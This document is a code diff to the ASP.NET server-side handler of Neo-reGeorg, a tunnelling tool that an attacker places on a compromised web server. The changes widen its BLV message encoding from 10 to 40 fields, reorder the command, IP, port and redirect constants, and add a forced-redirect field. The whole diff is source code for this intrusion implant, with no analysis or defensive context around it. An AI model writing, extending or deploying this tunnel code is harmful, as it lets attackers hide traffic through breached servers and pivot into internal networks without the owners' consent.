@@ -21,7 +21,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
     }
 
     public static Object[] blv_decode(byte[] data) {
-        Object[] info = new Object[10];
+        Object[] info = new Object[40];
 
         int i = 0;
         int data_len = data.Length;
@@ -37,7 +37,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
             byte[] v = new byte[l];
             dataInput.Read(v, 0, v.Length);
             i += ( 5 + l );
-            if ( b < 8 && b > 0 ) {
+            if ( b > 1 && b <= BLVHEAD_LEN ) {
                 info[b] = Encoding.Default.GetString(v);
             } else {
                 info[b] = v;
@@ -49,8 +49,8 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
 
     public static byte[] blv_encode(Object[] info) {
         Random r = new Random();
-        info[0] = randBytes(r, 5, 20);
-        info[9] = randBytes(r, 5, 20);
+        info[0]  = randBytes(r, 5, 20);
+        info[39] = randBytes(r, 5, 20);
         MemoryStream buf = new MemoryStream();
         for (int b = 0; b < info.Length; b++) {
             if ( info[b] != null ) {
@@ -99,19 +99,21 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
     }
 
     public void ProcessRequest (HttpContext context) {
-        int CMD         = 1;
-        int MARK        = 2;
-        int STATUS      = 3;
-        int ERROR       = 4;
-        int IP          = 5;
-        int PORT        = 6;
-        int REDIRECTURL = 7;
-        int DATA        = 8;
+
+        int DATA          = 1;
+        int CMD           = 2;
+        int MARK          = 3;
+        int STATUS        = 4;
+        int ERROR         = 5;
+        int IP            = 6;
+        int PORT          = 7;
+        int REDIRECTURL   = 8;
+        int FORCEREDIRECT = 9;
         
         String GeorgHello = "NeoGeorg says, 'All seems fine'";
         
-        Object[] info  = new Object[10];
-        Object[] rinfo = new Object[10];
+        Object[] info  = new Object[40];
+        Object[] rinfo = new Object[40];
 
         String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
         String de = "BASE64 CHARSLIST";
